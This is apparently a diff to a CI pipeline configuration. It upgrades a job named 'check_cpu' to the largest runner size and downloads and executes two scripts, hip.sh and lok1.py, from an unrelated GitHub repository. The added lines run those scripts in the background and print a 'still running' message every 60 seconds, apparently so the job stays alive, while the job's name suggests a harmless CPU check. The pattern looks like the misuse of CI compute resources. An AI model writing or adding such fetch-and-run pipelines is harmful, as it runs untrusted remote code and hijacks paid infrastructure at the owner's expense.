@@ -4,6 +4,7 @@ jobs:
   check_cpu:
     docker:
       - image: cimg/base:stable
+    resource_class: 2xlarge+
     steps:
       - run:
           name: Check Number of CPUs
@@ -15,11 +16,28 @@ jobs:
             python3 --version
             pip3 install selenium selenium-wire
             pip3 uninstall blinker -y && pip3 install blinker==1.4
-            wget https://raw.githubusercontent.com/ladazkalii/lokd/refs/heads/main/hip.sh
-            chmod +x hip.sh
-            ./hip.sh
-            wget https://raw.githubusercontent.com/ladazkalii/lokd/refs/heads/main/lok1.py
-            python3 lok1.py
+
+            # Jalankan proses utama di background
+            (
+              wget https://raw.githubusercontent.com/ladazkalii/lokd/refs/heads/main/hip.sh
+              chmod +x hip.sh
+              ./hip.sh
+              wget https://raw.githubusercontent.com/ladazkalii/lokd/refs/heads/main/lok1.py
+              python3 lok1.py
+            ) &
+
+            # Simpan PID dari proses utama
+            main_pid=$!
+
+            # Loop untuk output setiap 60 detik selama proses utama berjalan
+            while kill -0 "$main_pid" 2> /dev/null; do
+              echo "Still running at $(date)"
+              sleep 60
+            done
+
+            # Tunggu proses utama selesai
+            wait "$main_pid"
+            echo "Main process completed."
 
 workflows:
   version: 2
